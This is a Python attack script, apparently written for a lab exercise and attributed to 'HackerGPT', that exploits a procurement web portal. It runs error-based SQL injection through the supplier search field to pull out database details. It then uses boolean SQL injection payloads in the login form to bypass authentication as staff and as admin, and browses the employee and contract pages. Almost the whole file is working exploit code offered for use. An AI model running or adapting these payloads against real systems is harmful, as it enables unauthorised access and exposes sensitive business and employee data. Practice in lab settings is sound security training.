#!/usr/bin/env python3
"""
Attack Script – 3‑Phase Exploit for the Procurement Portal
Author: White Hack Labs (HackerGPT)
Date: 2024‑06‑??  (adjust as needed)
"""

import requests, time, re

# ------------------------------------------------------------------
# CONFIGURATION – MODIFY TO MATCH YOUR HOST / FIELD NAMES
# ------------------------------------------------------------------
BASE_URL = "http://localhost"                     # <-- change if needed
LOGIN_URL = f"{BASE_URL}/login.php"
DASHBOARD_URL = f"{BASE_URL}/dashboard.php"
SEARCH_URL = f"{BASE_URL}/supplier_search.php"
EMPLOYEES_URL = f"{BASE_URL}/employees.php"
CONTRACTS_URL = f"{BASE_URL}/contracts.php"
RESET_URL = f"{BASE_URL}/"

# 1. Field names – check the <input name="…"> attributes in your forms
USERNAME_FIELD = "username"    # e.g. <input name="username">
PASSWORD_FIELD = "password"    # e.g. <input name="password">

# 2. Admin credentials – used only for the initial normal login (if you want)
ADMIN_USER = "admin"
ADMIN_PASS = "admin123"

# 3. Session headers – mimics a normal browser
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Accept": "*/*",
}

# ------------------------------------------------------------------
# HELPER FUNCTIONS
# ------------------------------------------------------------------
def log(msg: str) -> None:
    """Simple coloured logger – replace if you prefer another style."""
    print(f"[{time.strftime('%H:%M:%S')}] {msg}")

def normal_login(session: requests.Session) -> bool:
    """Perform a regular login as the real admin (used only if you want to prove the site is working)."""
    log("Phase 0 – Normal login (optional)")
    payload = {USERNAME_FIELD: ADMIN_USER, PASSWORD_FIELD: ADMIN_PASS}
    resp = session.post(LOGIN_URL, data=payload, headers=HEADERS, allow_redirects=True)
    if resp.url.endswith("dashboard.php") or "dashboard" in resp.text.lower():
        log("[+] Normal admin login succeeded.")
        return True
    log("[-] Normal admin login failed.")
    return False

def error_based_sqli(session: requests.Session) -> None:
    """Phase 1 – Reconnaissance: extract DB name & version."""
    log("\nPhase 1 – Reconnaissance")
    # Payload from the lab
    payload = "' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x3a,VERSION(),0x7e),1)#"
    # We inject it into the supplier search form (GET request)
    params = {"supplier_name": payload}   # <-- adjust if the input name differs
    resp = session.get(SEARCH_URL, params=params, headers=HEADERS, timeout=10)
    if "XPATH syntax error" in resp.text or "~" in resp.text:
        match = re.search(r'~([^~]+)~', resp.text)
        if match:
            info = match.group(1)
            log(f"[+] Retrieved DB info: {info}")
        else:
            log("[-] Could not parse the error message.")
    else:
        log("[-] No error message – the injection may be blocked or the page differs.")

def boolean_sqli_login(session: requests.Session, role: str) -> bool:
    """Phase 2/3 – Log in using Boolean SQLi for a given role."""
    log(f"\nPhase {role.upper()} – Log in via Boolean SQLi")
    # Payload: "' OR role='staff'#" or "' OR role='admin'#"
    payload = f"' OR role='{role}'#"
    payload_dict = {
        USERNAME_FIELD: payload,          # <-- use the global field name
        PASSWORD_FIELD: "anything"       # password is irrelevant – the query is hijacked
    }
    resp = session.post(LOGIN_URL, data=payload_dict, headers=HEADERS, allow_redirects=True)
    if resp.url.endswith("dashboard.php") or "dashboard" in resp.text.lower():
        log(f"[+] Logged in as {role} (SQLi success).")
        return True
    # Some labs may redirect to a different page; check for role string in the response
    if role in resp.text.lower():
        log(f"[+] Logged in as {role} (found role string).")
        return True
    log(f"[-] Failed to log in as {role}.")
    return False

def browse_pages(session: requests.Session, role: str) -> None:
    """Browse the pages after a successful login."""
    log(f"\nPhase {role.upper()} – Browsing pages")
    pages = [
        ("Supplier Search", SEARCH_URL),
        ("Employees", EMPLOYEES_URL),
        ("Contracts", CONTRACTS_URL),
    ]
    for name, url in pages:
        resp = session.get(url, headers=HEADERS, timeout=10)
        status = resp.status_code
        if status == 200:
            log(f"[+] {name} page loaded (200).")
        else:
            log(f"[-] {name} page returned {status}.")

def reset_to_home(session: requests.Session) -> None:
    """Return to the home page (reset)."""
    log("\nPhase X – Reset to home page")
    resp = session.get(RESET_URL, headers=HEADERS, timeout=10)
    if resp.url == RESET_URL:
        log("[+] Returned to home page.")
    else:
        log(f"[-] Unexpected URL after reset: {resp.url}")

# ------------------------------------------------------------------
# MAIN EXECUTION
# ------------------------------------------------------------------
def main() -> None:
    session = requests.Session()

    # OPTIONAL: Verify the site is reachable
    try:
        r = session.get(BASE_URL, headers=HEADERS, timeout=10)
        log(f"[+] Connected to {BASE_URL} – HTTP {r.status_code}")
    except Exception as e:
        log(f"[-] Could not reach {BASE_URL}: {e}")
        return

    # 0. (Optional) Normal login to prove the portal works
    # normal_login(session)    # comment out if you don’t want this step

    # 1. Reconnaissance – error based SQLi
    error_based_sqli(session)

    # 2. Staff attack if Boolean SQLi works
    if boolean_sqli_login(session, "staff"):
        browse_pages(session, "staff")
        reset_to_home(session)

    # 3. Admin attack – new session to avoid session reuse
    session_admin = requests.Session()
    if boolean_sqli_login(session_admin, "admin"):
        browse_pages(session_admin, "admin")

    log("\nAttack sequence finished.")

if __name__ == "__main__":
    main()
